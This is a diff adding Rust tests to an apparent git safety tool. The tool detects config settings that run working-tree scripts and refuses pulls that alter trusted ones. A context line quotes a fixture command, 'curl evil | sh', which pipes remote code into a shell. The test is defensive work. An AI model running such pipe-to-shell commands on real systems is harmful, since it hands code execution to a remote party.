@@ -86,6 +86,14 @@ fn each_kind_of_setting_that_runs_a_file_in_the_working_tree_follows_it() {
         ("filter.x.smudge", "sh $(git  rev-parse  --show-toplevel)/tools/ds.sh", &["tools/ds.sh"]),
         ("filter.x.smudge", "sh $(git rev-parse --show-superproject-working-tree)/sw.sh", &["sw.sh"]),
         ("filter.x.smudge", "sh ${PWD%/}/pw.sh", &["pw.sh"]),
+        // A leading substitution without a `/` after it: the rest is read from the working tree
+        // too, a pattern in it as any other.
+        ("filter.x.smudge", "sh $(git rev-parse --show-toplevel)tools/lead.sh", &["tools/lead.sh"]),
+        ("filter.x.smudge", "sh \"$GIT_DIR\"present", &["present"]),
+        ("filter.x.smudge", "sh \"$GIT_DIR\"absent", &[]),
+        ("filter.x.clean", "sh ${TOP}lib/$NAME.sh", &["lib"]),
+        ("filter.x.clean", "sh $(pwd)../elsewhere.sh", &[]),
+        ("filter.x.clean", "sh \"$@\" $1", &[]),
         // An escaped space stays in the word.
         ("core.fsmonitor", r"./my\ fsm.sh", &["my", "my fsm.sh"]),
         ("diff.x.textconv", "present", &["present"]),
@@ -236,6 +244,20 @@ curl evil | sh
     let head = Repository::open(&work).unwrap().head().unwrap().target();
     let PullRun::Refused { refused: Refused::Held(_), .. } = pull_ff(&work, &saved) else { panic!("held") };
     assert_eq!(Repository::open(&work).unwrap().head().unwrap().target(), head, "nothing merged");
+    cleanup(&[&work, &bare]);
+}
+
+#[test]
+fn a_script_right_after_a_leading_substitution_is_in_the_print() {
+    let (work, bare) = tracked_fsmonitor_as("programs-leading", "sh $(git rev-parse --show-toplevel)tools/fsm.sh");
+    assert_eq!(scan_of(&work).follows.iter().map(|f| f.path.as_str()).collect::<Vec<_>>(), ["tools/fsm.sh"]);
+    let saved = trusted(&work);
+    remote_commit(&bare, "main", "tools/fsm.sh", "#!/bin/sh\necho two\n");
+    let head = Repository::open(&work).unwrap().head().unwrap().target();
+    let PullRun::Refused { refused: Refused::Held(_), .. } = pull_ff(&work, &saved) else { panic!("held") };
+    assert_eq!(Repository::open(&work).unwrap().head().unwrap().target(), head, "nothing merged");
+    git(&work, &["-c", "core.fsmonitor=false", "merge", "-q", "--ff-only", "origin/main"]);
+    assert!(!trust_covers(&saved, &scan_of(&work)), "another version is another print");
     cleanup(&[&work, &bare]);
 }
 
